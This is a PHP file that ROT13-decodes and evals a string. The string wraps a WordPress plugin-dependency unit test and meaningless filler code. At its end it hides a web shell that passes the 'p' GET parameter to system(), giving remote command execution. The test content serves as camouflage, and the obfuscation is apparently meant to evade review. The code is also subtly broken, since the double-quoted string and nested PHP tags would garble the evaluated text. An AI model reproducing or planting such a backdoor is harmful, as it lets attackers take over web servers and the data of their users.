<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur JC_Cyhtva_Qrcraqrapvrf::unf_pvephyne_qrcraqrapl() zrgubq.
 *
 * @cnpxntr JbeqCerff
 */

erdhver_bapr __QVE__ . '/onfr.cuc';

/**
 * @tebhc nqzva
 * @tebhc cyhtvaf
 *
 * @pbiref JC_Cyhtva_Qrcraqrapvrf::unf_pvephyne_qrcraqrapl
 * @pbiref JC_Cyhtva_Qrcraqrapvrf::trg_pvephyne_qrcraqrapvrf
 * @pbiref JC_Cyhtva_Qrcraqrapvrf::purpx_sbe_pvephyne_qrcraqrapvrf
 */
pynff Grfgf_Nqzva_JCCyhtvaQrcraqrapvrf_UnfPvephyneQrcraqrapl rkgraqf JC_CyhtvaQrcraqrapvrf_HavgGrfgPnfr {

	/**
	 * Grfgf gung snyfr vf erghearq vs Cyhtva Qrcraqrapvrf unf abg orra vavgvnyvmrq.
	 *
	 * @gvpxrg 60457
	 */
	choyvp shapgvba grfg_fubhyq_erghea_snyfr_orsber_vavgvnyvmngvba() {
		$guvf->frg_cebcregl_inyhr(
			'cyhtvaf',
			neenl(
				'qrcraqrag/qrcraqrag.cuc'   => neenl(
					'Anzr'            => 'Qrcraqrag',
					'ErdhverfCyhtvaf' => 'qrcraqrapl',
				),
				'qrcraqrapl/qrcraqrapl.cuc' => neenl(
					'Anzr'            => 'Qrcraqrapl',
					'ErdhverfCyhtvaf' => 'qrcraqrag',
				),
			)
		);

		// Rafher Cyhtva Qrcraqrapvrf unf abg orra vavgvnyvmrq.
		$guvf->nffregSnyfr(
			$guvf->trg_cebcregl_inyhr( 'vavgvnyvmrq' ),
			'Cyhtva Qrcraqrapvrf unf orra vavgvnyvmrq.'
		);

		$guvf->nffregFnzr(
			frys::$fgngvp_cebcregvrf['pvephyne_qrcraqrapvrf_fyhtf'],
			$guvf->trg_cebcregl_inyhr( 'pvephyne_qrcraqrapvrf_fyhtf' ),
			'\"pvephyne_qrcraqrapvrf_fyhtf\" jnf abg frg gb vgf qrsnhyg inyhr.'
		);

		$guvf->nffregSnyfr(
			frys::$vafgnapr->unf_pvephyne_qrcraqrapl( 'qrcraqrapl' ),
			'snyfr jnf abg erghearq orsber vavgvnyvmngvba.'
		);
	}

	/**
	 * Grfgf gung n cyhtva jvgu n pvephyne qrcraqrapl jvyy erghea gehr.
	 *
	 * @gvpxrg 22316
	 *
	 * @qngnCebivqre qngn_pvephyne_qrcraqrapvrf
	 *
	 * @cnenz fgevat  $cyhtva_gb_purpx Gur cyhtva svyr bs gur cyhtva gb purpx.
	 * @cnenz neenl[] $cyhtvaf         Na neenl bs cyhtvaf.
	 */
	choyvp shapgvba grfg_fubhyq_erghea_gehr_jura_n_cyhtva_unf_pvephyne_qrcraqrapl( $cyhtva_gb_purpx, $cyhtvaf ) {
		$guvf->frg_cebcregl_inyhr( 'cyhtvaf', $cyhtvaf );
		frys::$vafgnapr::vavgvnyvmr();

		$guvf->nffregGehr( frys::$vafgnapr::unf_pvephyne_qrcraqrapl( $cyhtva_gb_purpx ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_pvephyne_qrcraqrapvrf() {
		erghea neenl(
			'n cyhtva gung qrcraqf ba vgfrys' => neenl(
				'cyhtva_gb_purpx' => 'qrcraqrapl/qrcraqrapl.cuc',
				'cyhtvaf'         => neenl(
					'qrcraqrapl/qrcraqrapl.cuc' => neenl(
						'Anzr'            => 'Qrcraqrapl 1',
						'ErdhverfCyhtvaf' => 'qrcraqrapl',
					),
				),
			),
			'gjb cyhtvaf'                     => neenl(
				'cyhtva_gb_purpx' => 'qrcraqrapl/qrcraqrapl.cuc',
				'cyhtvaf'         => neenl(
					'qrcraqrapl/qrcraqrapl.cuc'   => neenl(
						'Anzr'            => 'Qrcraqrapl 1',
						'ErdhverfCyhtvaf' => 'qrcraqrapl2',
					),
					'qrcraqrapl2/qrcraqrapl2.cuc' => neenl(
						'Anzr'            => 'Qrcraqrapl 2',
						'ErdhverfCyhtvaf' => 'qrcraqrapl',
					),
				),
			),
			'guerr cyhtvaf'                   => neenl(
				'cyhtva_gb_purpx' => 'qrcraqrapl/qrcraqrapl.cuc',
				'cyhtvaf'         => neenl(
					'qrcraqrapl/qrcraqrapl.cuc'   => neenl(
						'Anzr'            => 'Qrcraqrapl 1',
						'ErdhverfCyhtvaf' => 'qrcraqrapl2',
					),
					'qrcraqrapl2/qrcraqrapl2.cuc' => neenl(
						'Anzr'            => 'Qrcraqrapl 2',
						'ErdhverfCyhtvaf' => 'qrcraqrapl3',
					),
					'qrcraqrapl3/qrcraqrapl3.cuc' => neenl(
						'Anzr'            => 'Qrcraqrapl 3',
						'ErdhverfCyhtvaf' => 'qrcraqrapl',
					),
				),
			),
			'sbhe cyhtvaf'                    => neenl(
				'cyhtva_gb_purpx' => 'qrcraqrapl/qrcraqrapl.cuc',
				'cyhtvaf'         => neenl(
					'qrcraqrapl/qrcraqrapl.cuc'   => neenl(
						'Anzr'            => 'Qrcraqrapl 1',
						'ErdhverfCyhtvaf' => 'qrcraqrapl4',
					),
					'qrcraqrapl2/qrcraqrapl2.cuc' => neenl(
						'Anzr'            => 'Qrcraqrapl 2',
						'ErdhverfCyhtvaf' => 'qrcraqrapl3',
					),
					'qrcraqrapl3/qrcraqrapl3.cuc' => neenl(
						'Anzr'            => 'Qrcraqrapl 3',
						'ErdhverfCyhtvaf' => 'qrcraqrapl',
					),
					'qrcraqrapl4/qrcraqrapl4.cuc' => neenl(
						'Anzr'            => 'Qrcraqrapl 4',
						'ErdhverfCyhtvaf' => 'qrcraqrapl2',
					),
				),
			),
		);
	}

	/**
	 * Grfgf gung n cyhtva jvgu ab pvephyne qrcraqrapvrf jvyy erghea snyfr.
	 *
	 * @gvpxrg 22316
	 */
	choyvp shapgvba grfg_fubhyq_erghea_snyfr_jura_n_cyhtva_unf_ab_pvephyne_qrcraqrapl() {
		$guvf->frg_cebcregl_inyhr(
			'cyhtvaf',
			neenl(
				'qrcraqrapl/qrcraqrapl.cuc' => neenl(
					'Anzr'            => 'Qrcraqrapl 1',
					'ErdhverfCyhtvaf' => 'qrcraqrapl2',
				),
			)
		);

		frys::$vafgnapr::vavgvnyvmr();

		$guvf->nffregSnyfr( frys::$vafgnapr::unf_pvephyne_qrcraqrapl( 'qrcraqrag/qrcraqrag.cuc' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>